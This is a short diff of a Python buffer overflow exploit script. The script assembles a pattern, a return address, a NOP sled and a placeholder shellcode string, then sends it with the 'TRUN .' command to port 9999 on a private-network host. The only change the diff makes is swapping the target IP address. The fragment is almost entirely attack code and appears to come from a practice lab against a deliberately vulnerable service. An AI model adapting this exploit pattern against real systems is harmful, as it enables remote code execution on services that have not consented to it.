@@ -10,7 +10,7 @@ shellcode=("shellcode")
 buffer = pattern + return_address + nops + shellcode
 try:
    print "sending attack buffer"
-   s.connect(('10.0.2.10', 9999))
+   s.connect(('10.0.0.64', 9999))
    data =s.recv(1024)
    s.send('TRUN . ' + buffer + '\r\n')
    data = s.recv(1024)
